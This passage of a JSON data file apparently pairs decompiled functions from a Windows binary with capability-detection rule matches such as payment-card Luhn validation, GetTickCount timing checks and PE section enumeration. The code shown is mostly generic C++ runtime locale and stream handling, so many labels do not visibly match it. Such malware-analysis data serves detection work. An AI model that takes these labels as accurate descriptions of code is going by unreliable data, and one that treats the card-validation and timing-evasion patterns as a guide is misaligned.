            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e740(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_1 + 8);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.004c2c70(200);\n        puVar1[1] = 0;\n        *puVar1 = 0x52c564;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[7] = 0;\n        puVar1[8] = 0;\n        puVar1[9] = 0;\n        puVar1[10] = 0;\n        puVar1[0xb] = 0;\n        puVar1[0xc] = 0;\n        puVar1[0xd] = 0;\n        puVar1[0xe] = 0;\n        puVar1[0xf] = 0;\n        puVar1[0x10] = 0;\n        puVar1[0x11] = 0;\n        puVar1[0x12] = 0;\n        puVar1[0x13] = 0;\n        puVar1[0x14] = 0;\n        puVar1[0x15] = 0;\n        puVar1[0x16] = 0;\n        puVar1[0x17] = 0;\n        puVar1[0x18] = 0;\n        puVar1[0x19] = 0;\n        puVar1[0x1a] = 0;\n        puVar1[0x1b] = 0;\n        puVar1[0x1c] = 0;\n        puVar1[0x1d] = 0;\n        puVar1[0x1e] = 0;\n        puVar1[0x1f] = 0;\n        puVar1[0x20] = 0;\n        puVar1[0x21] = 0;\n        puVar1[0x22] = 0;\n        puVar1[0x23] = 0;\n        puVar1[0x24] = 0;\n        puVar1[0x25] = 0;\n        puVar1[0x26] = 0;\n        puVar1[0x27] = 0;\n        puVar1[0x28] = 0;\n        puVar1[0x29] = 0;\n        puVar1[0x2a] = 0;\n        puVar1[0x2b] = 0;\n        puVar1[0x2c] = 0;\n        puVar1[0x2d] = 0;\n        puVar1[0x2e] = 0;\n        puVar1[0x2f] = 0;\n        puVar1[0x30] = 0;\n        *(puVar1 + 0x31) = 0;\n        *(param_1 + 8) = puVar1;\n    }\n    puVar1[2] = \"%m/%d/%y\";\n    puVar1[3] = \"%m/%d/%y\";\n    puVar1[4] = 0x526735;\n    puVar1[5] = 0x526735;\n    puVar1[6] = 0x52673e;\n    puVar1[7] = 0x52673e;\n    puVar1[8] = 0x52673f;\n    puVar1[9] = 0x526742;\n    puVar1[10] = 0x52673e;\n    puVar1[0xb] = 0x526745;\n    puVar1[0xc] = 0x52674c;\n    puVar1[0xd] = 0x526753;\n    puVar1[0xe] = 0x52675b;\n    puVar1[0xf] = 0x526765;\n    puVar1[0x10] = 0x52676e;\n    puVar1[0x11] = 0x526775;\n    puVar1[0x12] = 0x52677e;\n    puVar1[0x13] = 0x526782;\n    puVar1[0x14] = 0x526786;\n    puVar1[0x15] = 0x52678a;\n    puVar1[0x16] = 0x52678e;\n    puVar1[0x17] = 0x526792;\n    puVar1[0x18] = 0x526796;\n    puVar1[0x19] = 0x52679a;\n    puVar1[0x1a] = 0x5267a2;\n    puVar1[0x1b] = 0x5267ab;\n    puVar1[0x1c] = 0x5267b1;\n    puVar1[0x1d] = 0x5267b7;\n    puVar1[0x1e] = 0x5267bb;\n    puVar1[0x1f] = 0x5267c0;\n    puVar1[0x20] = 0x5267c5;\n    puVar1[0x21] = 0x5267cc;\n    puVar1[0x22] = 0x5267d6;\n    puVar1[0x23] = 0x5267de;\n    puVar1[0x24] = 0x5267e7;\n    puVar1[0x25] = 0x5267f0;\n    puVar1[0x26] = 0x5267f4;\n    puVar1[0x27] = 0x5267f8;\n    puVar1[0x28] = 0x5267fc;\n    puVar1[0x29] = 0x5267b7;\n    puVar1[0x2a] = 0x526800;\n    puVar1[0x2b] = 0x526804;\n    puVar1[0x2c] = 0x526808;\n    puVar1[0x2d] = 0x52680c;\n    puVar1[0x2e] = 0x526810;\n    puVar1[0x2f] = 0x526814;\n    puVar1[0x30] = 0x526818;\n    return;\n}\n",
        "token_count": 1507
    },
    "0048ee80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048ee80(int32_t param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = *(param_1 + 8);\n    if (puVar1 == NULL) {\n        puVar1 = fcn.004c2c70(200);\n        puVar1[1] = 0;\n        *puVar1 = 0x52c574;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[7] = 0;\n        puVar1[8] = 0;\n        puVar1[9] = 0;\n        puVar1[10] = 0;\n        puVar1[0xb] = 0;\n        puVar1[0xc] = 0;\n        puVar1[0xd] = 0;\n        puVar1[0xe] = 0;\n        puVar1[0xf] = 0;\n        puVar1[0x10] = 0;\n        puVar1[0x11] = 0;\n        puVar1[0x12] = 0;\n        puVar1[0x13] = 0;\n        puVar1[0x14] = 0;\n        puVar1[0x15] = 0;\n        puVar1[0x16] = 0;\n        puVar1[0x17] = 0;\n        puVar1[0x18] = 0;\n        puVar1[0x19] = 0;\n        puVar1[0x1a] = 0;\n        puVar1[0x1b] = 0;\n        puVar1[0x1c] = 0;\n        puVar1[0x1d] = 0;\n        puVar1[0x1e] = 0;\n        puVar1[0x1f] = 0;\n        puVar1[0x20] = 0;\n        puVar1[0x21] = 0;\n        puVar1[0x22] = 0;\n        puVar1[0x23] = 0;\n        puVar1[0x24] = 0;\n        puVar1[0x25] = 0;\n        puVar1[0x26] = 0;\n        puVar1[0x27] = 0;\n        puVar1[0x28] = 0;\n        puVar1[0x29] = 0;\n        puVar1[0x2a] = 0;\n        puVar1[0x2b] = 0;\n        puVar1[0x2c] = 0;\n        puVar1[0x2d] = 0;\n        puVar1[0x2e] = 0;\n        puVar1[0x2f] = 0;\n        puVar1[0x30] = 0;\n        *(puVar1 + 0x31) = 0;\n        *(param_1 + 8) = puVar1;\n    }\n    puVar1[2] = 0x52681c;\n    puVar1[3] = 0x52681c;\n    puVar1[4] = L\"%H:%M:%S\";\n    puVar1[5] = L\"%H:%M:%S\";\n    puVar1[6] = 0x526840;\n    puVar1[7] = 0x526840;\n    puVar1[8] = 0x526842;\n    puVar1[9] = 0x526848;\n    puVar1[10] = 0x526840;\n    puVar1[0xb] = L\"Sunday\";\n    puVar1[0xc] = L\"Monday\";\n    puVar1[0xd] = L\"Tuesday\";\n    puVar1[0xe] = L\"Wednesday\";\n    puVar1[0xf] = L\"Thursday\";\n    puVar1[0x10] = L\"Friday\";\n    puVar1[0x11] = L\"Saturday\";\n    puVar1[0x12] = 0x5268c0;\n    puVar1[0x13] = 0x5268c8;\n    puVar1[0x14] = 0x5268d0;\n    puVar1[0x15] = 0x5268d8;\n    puVar1[0x16] = 0x5268e0;\n    puVar1[0x17] = 0x5268e8;\n    puVar1[0x18] = 0x5268f0;\n    puVar1[0x19] = L\"January\";\n    puVar1[0x1a] = L\"February\";\n    puVar1[0x1b] = L\"March\";\n    puVar1[0x1c] = L\"April\";\n    puVar1[0x1d] = 0x526932;\n    puVar1[0x1e] = L\"June\";\n    puVar1[0x1f] = L\"July\";\n    puVar1[0x20] = L\"August\";\n    puVar1[0x21] = L\"September\";\n    puVar1[0x22] = L\"October\";\n    puVar1[0x23] = L\"November\";\n    puVar1[0x24] = L\"December\";\n    puVar1[0x25] = 0x5269a4;\n    puVar1[0x26] = 0x5269ac;\n    puVar1[0x27] = 0x5269b4;\n    puVar1[0x28] = 0x5269bc;\n    puVar1[0x29] = 0x526932;\n    puVar1[0x2a] = 0x5269c4;\n    puVar1[0x2b] = 0x5269cc;\n    puVar1[0x2c] = 0x5269d4;\n    puVar1[0x2d] = 0x5269dc;\n    puVar1[0x2e] = 0x5269e4;\n    puVar1[0x2f] = 0x5269ec;\n    puVar1[0x30] = 0x5269f4;\n    return;\n}\n",
        "token_count": 1467
    },
    "00490250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00490250(uint *param_1)\n\n{\n    sub.msvcrt.dll__fileno_1(*param_1);\n    return;\n}\n",
        "token_count": 37
    },
    "004903a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004903a0(void)\n\n{\n    fcn.00490250();\n    fcn.00448530();\n    return;\n}\n",
        "token_count": 32
    },
    "00490400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00490400(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    pcVar2 = _sym.imp.msvcrt.dll__errno;\n    if ((*param_1 == 0) && (param_2 != 0)) {\n        puVar3 = (*_sym.imp.msvcrt.dll__errno)();\n        uVar1 = *puVar3;\n        puVar3 = (*pcVar2)();\n        *puVar3 = 0;\n        do {\n            iVar5 = sub.msvcrt.dll_fflush(param_2);\n            if (iVar5 == 0) {\n                puVar3 = (*pcVar2)();\n                *puVar3 = uVar1;\n                *param_1 = param_2;\n                *(param_1 + 1) = 0;\n                return param_1;\n            }\n            piVar4 = (*pcVar2)();\n        } while (*piVar4 == 4);\n        puVar3 = (*pcVar2)();\n        *puVar3 = uVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 274
    },
    "00490630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00490630(uint param_1, uint param_2)\n\n{\n    uchar auStack13 [13];\n    \n    fcn.0048cd00(param_1, param_2, auStack13);\n    return;\n}\n",
        "token_count": 52
    },
    "004907c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004907c0(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    *param_1 = param_1 + 2;\n    fcn.004b02f0(param_2, param_3 + param_2, 0);\n    return;\n}\n",
        "token_count": 76
    },
    "004915c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.004915c0(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t *arg_30h)\n\n{\n    uint uVar1;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        var_2ch = 0;\n        var_28h._0_1_ = 0;\n        var_30h = &var_28h;\n        uVar1 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_30h);\n        if (*arg_28h == 0) {\n            if (arg_30h[6] != NULL) {\n                (*arg_30h[6])(arg_30h);\n            }\n            *arg_30h = arg_30h + 2;\n            fcn.004b03b0(var_30h, var_2ch + var_30h, 0);\n            arg_30h[6] = 0x493700;\n        }\n        if (var_30h != &var_28h) {\n            fcn.004c2c30(var_30h);\n            return uVar1;\n        }\n    }\n    else {\n        uVar1 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 472
    },
    "00491890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00491890(uint noname_0, int32_t *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t *arg_28h, int32_t arg_2ch, int32_t *arg_30h)\n\n{\n    uint uVar1;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    if (arg_2ch == 0) {\n        var_30h = &var_28h;\n        var_28h._0_2_ = 0;\n        var_2ch = 0;\n        uVar1 = (**(*arg_ch + 0xc))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, &var_30h);\n        if (*arg_28h == 0) {\n            if (arg_30h[6] != NULL) {\n                (*arg_30h[6])(arg_30h);\n            }\n            *arg_30h = arg_30h + 2;\n            fcn.004b3120(var_30h, var_30h + var_2ch * 2, 0);\n            arg_30h[6] = 0x493780;\n        }\n        if (var_30h != &var_28h) {\n            fcn.004c2c30(var_30h);\n            return uVar1;\n        }\n    }\n    else {\n        uVar1 = (**(*arg_ch + 8))(arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 487
    },
    "00491b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00491bbb)\n\nuint fcn.00491b30(uint param_1, int32_t *param_2, uint param_3, uint param_4, uint32_t param_5, uint param_6, \n                 uint param_7)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    uint var_1ch_3;\n    int32_t in_stack_0000002c;\n    uint var_30h_2;\n    uint var_28h;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_30h;\n    uint32_t in_stack_fffffed0;\n    uchar *puStack256;\n    uchar auStack248 [8];\n    uint uStack240;\n    uchar *puStack236;\n    uint uStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uchar *puStack208;\n    uint32_t uStack204;\n    int32_t *piStack196;\n    uint uStack192;\n    uint uStack188;\n    uchar uStack184;\n    uint uStack180;\n    ushort uStack176;\n    ushort uStack172;\n    ulong uStack170;\n    int32_t *piStack160;\n    uchar uStack141;\n    int32_t iStack140;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack112;\n    int32_t *piStack100;\n    uint32_t uStack88;\n    uint var_20h_3;\n    int32_t var_3ch_2;\n    uint *var_30h_4;\n    uint var_28h_3;\n    \n    if (in_stack_0000002c == 0) {\n        puStack112 = 0x491c16;\n        uVar3 = (**(*param_2 + 8))();\n        return uVar3;\n    }\n    if (*(in_stack_0000002c + 0x18) != 0) {\n        puStack112 = 0x491b7b;\n        fcn.004b02f0();\n        uStack120 = param_3;\n        uStack124 = 0x491bae;\n        puStack112 = param_5 & 0xff;\n        uVar3 = (**(*param_2 + 0xc))();\n        return uVar3;\n    }\n    puStack112 = 0x491c2d;\n    uStack124 = fcn.004be210(\"uninitialized __any_string\");\n    if (var_30h_4 != &fcn.00491b30::var_28h_3) {\n        puStack112 = 0x491c41;\n        fcn.004c2c30();\n    }\n    puStack112 = 0x491c49;\n    fcn.0043a8e0();\n    uStack120 = param_7;\n    if (var_3ch_2 == 0) {\n        uStack204 = 0x491d24;\n        puStack112 = &stack0xfffffffc;\n        uVar3 = (**(*piStack100 + 8))();\n        return uVar3;\n    }\n    iStack212 = *(var_3ch_2 + 0x18);\n    if (iStack212 == 0) {\n        uStack204 = 0x491d6f;\n        puStack112 = &stack0xfffffffc;\n        uStack220 = fcn.004be210(0x52380c);\n        uStack204 = 0x491d82;\n        fcn.00483770();\n        puStack208 = 0x491d8b;\n        uStack204 = uStack220;\n        fcn.0043a8e0();\n        if (piStack160 == NULL) {\n            puStack208 = &stack0xffffff90;\n            uVar3 = (**(*piStack196 + 8))\n                              (uStack192, uStack188, uStack184, uStack180, uStack176, CONCAT82(uStack170, uStack172));\n            return uVar3;\n        }\n        if (piStack160[6] != 0) {\n            puStack256 = &stack0xffffff08;\n            puStack208 = &stack0xffffff90;\n            fcn.004b3070(*piStack160, *piStack160 + piStack160[1] * 2, in_stack_fffffed0 & 0xffffff00);\n            uVar3 = (**(*piStack196 + 0xc))(uStack192, uStack188, uStack184, uStack180, uStack176, &stack0xffffff00);\n            if (puStack256 != &stack0xffffff08) {\n                fcn.004c2c30(puStack256);\n            }\n            return uVar3;\n        }\n        puStack208 = &stack0xffffff90;\n        uVar3 = fcn.004be210(\"uninitialized __any_string\");\n        if (puStack256 != &stack0xffffff08) {\n            fcn.004c2c30(puStack256);\n        }\n        fcn.0043a8e0(uVar3);\n        iVar4 = *0x515a34;\n        *extraout_ECX = 0x52b530;\n        piVar1 = extraout_ECX[3];\n        if (iVar4 == 0) {\n            iVar4 = piVar1[1];\n            piVar1[1] = iVar4 + -1;\n        }\n        else {\n            LOCK();\n            piVar2 = piVar1 + 1;\n            iVar4 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar4 == 1) {\n            (**(*piVar1 + 4))();\n        }\n        *extraout_ECX = 0x52cab0;\n        fcn.004aea30(extraout_ECX + 2);\n        fcn.004aea60();\n        uVar3 = fcn.004c2c30(extraout_ECX);\n        return uVar3;\n    }\n    uStack204 = 0x491c98;\n    puStack112 = &stack0xfffffffc;\n    fcn.00484f70();\n    uStack216 = 0x491cc6;\n    uStack204 = uStack88 & 0xff;\n    uVar3 = (**(*piStack100 + 0xc))();\n    if (*0x515a34 == 0) {\n        iVar4 = *(iStack140 + -4);\n        *(iStack140 + -4) = iVar4 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack140 + -4;\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar4 < 1) {\n        puStack236 = &stack0xffffff73;\n        uStack240 = 0x491d52;\n        fcn.00483750();\n        return uVar3;\n    }\n    return uVar3;\n}\n",
        "token_count": 1559
    },
    "00493900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl\nfcn.00493900(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h\n            , int32_t arg_24h)\n\n{\n    uint *var_48h;\n    uint var_40h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_48h = &var_40h;\n    fcn.004b02f0(arg_20h, arg_24h + arg_20h, 0);\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h, arg_1ch, &var_48h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.004b03b0(var_30h, var_2ch + var_30h, 0);\n    arg_10h[6] = 0x493700;\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004c2c30(var_48h);\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "00493ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00493ce0(uint noname_0, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *var_30h;\n    uint var_28h;\n    uint var_ch;\n    \n    var_30h = &var_28h;\n    fcn.004b02f0(arg_10h, arg_14h + arg_10h, 0);\n    uVar1 = (**(*arg_ch + 8))(&var_30h, arg_18h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    return uVar1;\n}\n",
        "token_count": 189
    },
    "00493e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00493e10(uint noname_0, int32_t *arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *var_30h;\n    uint var_28h;\n    uint var_ch;\n    \n    var_30h = &var_28h;\n    fcn.004b02f0(arg_10h, arg_14h + arg_10h, 0);\n    uVar1 = (**(*arg_ch + 8))(&var_30h, arg_18h);\n    if (var_30h != &var_28h) {\n        fcn.004c2c30(var_30h);\n    }\n    return uVar1;\n}\n",
        "token_count": 189
    },
    "004940d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __cdecl fcn.004940d0(uint noname_0, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_bp_4h;\n    \n    uVar1 = 0x4940f6;\n    (**(*arg_ch + 0xc))(arg_ch, arg_14h, arg_18h);\n    if (arg_10h[6] != NULL) {\n        (*arg_10h[6])(arg_10h);\n    }\n    *arg_10h = arg_10h + 2;\n    fcn.004b03b0(var_20h, var_1ch + var_20h, uVar1 & 0xffffff00);\n    arg_10h[6] = 0x493700;\n    if (var_20h != &fcn.004940d0::var_18h) {\n        fcn.004c2c30(var_20h);\n    }\n    return;\n}\n",
        "token_count": 275
    },
    "00496840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00496840(int32_t param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    cVar2 = fcn.0044e030();\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.00496250();\n        *(param_1 + 0x30) = 0;\n        *(param_1 + 0x54) = 0;\n        fcn.004964c0();\n        *(param_1 + 0x49) = 0;\n        uVar1 = *(param_1 + 0x40);\n        *(param_1 + 0x14) = 0;\n        *(param_1 + 4) = uVar1;\n        *(param_1 + 8) = uVar1;\n        *(param_1 + 0xc) = uVar1;\n        *(param_1 + 0x10) = 0;\n        *(param_1 + 0x18) = 0;\n        *(param_1 + 0x38) = *(param_1 + 0x34);\n        *(param_1 + 0x3c) = *(param_1 + 0x34);\n        iVar3 = fcn.00490300();\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return param_1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 325
    },
    "004984d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004984d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    char unaff_DI;\n    ulong uVar5;\n    int32_t in_stack_00000024;\n    \n    if (*(param_1 + 0x44) < 0x3fffffff) {\n        iVar1 = fcn.004c2c50(*(param_1 + 0x44) * 2);\n        *(param_1 + 0x48) = 1;\n        *(param_1 + 0x40) = iVar1;\n        return iVar1;\n    }\n    fcn.004c33a0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    fcn.004c3080();\n    fcn.0043a8e0();\n    uVar5 = fcn.004c33a0();\n    if (uVar5 >> 0x20 != 1) {\n        fcn.0043a8e0(uVar5);\n    }\n    fcn.004c2e40();\n    fcn.004c2fb0();\n    uVar2 = *(unaff_EBX + 0x14) | 1;\n    *(unaff_EBX + 0x14) = uVar2;\n    if ((*(unaff_EBX + 0x10) & uVar2) == 0) {\n        if (unaff_DI == '\\0') {\n            *(unaff_EBX + 0x1c) = 0;\n        }\n        else {\n            *(unaff_EBX + 0x20) = 0;\n        }\n        return unaff_EBX + 0x1c;\n    }\n    iVar3 = fcn.004bdff0(\"ios_base::_M_grow_words allocation failed\");\n    iVar1 = *(unaff_EBX + 0x68);\n    uVar4 = extraout_ECX;\n    if ((iVar1 != unaff_EBP) && (iVar1 != 0)) {\n        fcn.004c2c20(iVar1);\n    }\n    *(unaff_EBX + 0x68) = iVar3;\n    *(unaff_EBX + 100) = uVar4;\n    return iVar3 + in_stack_00000024 * 8;\n}\n",
        "token_count": 714
    },
    "004987e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004987e0(int32_t param_1)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    cVar2 = fcn.0044e030();\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.004981e0();\n        *(param_1 + 0x30) = 0;\n        *(param_1 + 0x58) = 0;\n        fcn.00498450();\n        *(param_1 + 0x49) = 0;\n        uVar1 = *(param_1 + 0x40);\n        *(param_1 + 0x14) = 0;\n        *(param_1 + 4) = uVar1;\n        *(param_1 + 8) = uVar1;\n        *(param_1 + 0xc) = uVar1;\n        *(param_1 + 0x10) = 0;\n        *(param_1 + 0x18) = 0;\n        *(param_1 + 0x38) = *(param_1 + 0x34);\n        *(param_1 + 0x3c) = *(param_1 + 0x34);\n        iVar3 = fcn.00490300();\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return param_1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 326
    },
    "004a5a80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004a5a80(code **param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.c_streambufIwSt11char_traitsIwEE.0;\n    param_1[1] = *(param_2 + 4);\n    param_1[2] = *(param_2 + 8);\n    param_1[3] = *(param_2 + 0xc);\n    param_1[4] = *(param_2 + 0x10);\n    param_1[5] = *(param_2 + 0x14);\n    param_1[6] = *(param_2 + 0x18);\n    iVar2 = *0x515a34;\n    piVar1 = *(param_2 + 0x1c);\n    param_1[7] = piVar1;\n    if (iVar2 == 0) {\n        *piVar1 = *piVar1 + 1;\n        return;\n    }\n    LOCK();\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 259
    },
    "004aebe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004aebe0(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = *0x515a34;\n    piVar1 = *param_2;\n    *param_1 = piVar1;\n    if (iVar2 == 0) {\n        *piVar1 = *piVar1 + 1;\n        return;\n    }\n    LOCK();\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 127
    },
    "004a5ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004a5ed0(int32_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    code *UNRECOVERED_JUMPTABLE;\n    int16_t iVar3;\n    uint32_t uVar4;\n    \n    puVar2 = param_1[2];\n    if (puVar2 < param_1[3]) {\n        uVar1 = *puVar2;\n        param_1[2] = puVar2 + 1;\n        return uVar1;\n    }\n    UNRECOVERED_JUMPTABLE = *(*param_1 + 0x28);\n    if (UNRECOVERED_JUMPTABLE == method.ages_bynameIcE.virtual_40) {\n        UNRECOVERED_JUMPTABLE = *(*param_1 + 0x24);\n        if (UNRECOVERED_JUMPTABLE == method.ages_bynameIcE.virtual_36) {\n            return 0xffffffff;\n        }\n        iVar3 = (*UNRECOVERED_JUMPTABLE)();\n        if (iVar3 == -1) {\n            uVar4 = 0xffffffff;\n        }\n        else {\n            uVar4 = *param_1[2];\n            param_1[2] = param_1[2] + 1;\n        }\n        return uVar4;\n    }\n    // WARNING: Could not recover jumptable at 0x004a5f00. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar4 = (*UNRECOVERED_JUMPTABLE)();\n    return uVar4;\n}\n",
        "token_count": 359
    },
    "004a6420": {
        "rules": [
